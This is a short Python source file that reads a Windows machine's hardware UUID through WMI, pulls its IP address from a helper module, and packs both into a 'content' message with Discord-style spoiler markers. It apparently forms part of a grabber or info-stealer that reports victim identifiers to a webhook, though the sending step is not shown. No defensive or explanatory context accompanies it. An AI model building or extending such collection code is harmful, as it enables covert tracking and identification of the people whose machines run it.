import logging
import wmi
from functions.ip_get import ip_address

def get_hwid():
    try:
        c = wmi.WMI()
        system_info = c.Win32_ComputerSystemProduct()[0]
        return system_info.UUID
    except Exception as e:
        logging.error(f"Failed to retrieve HWID: {str(e)}")
        return None
    
hwid = get_hwid()
payload = {
    "content": f"IP: ||{ip_address}||\nHWID: {hwid}"
}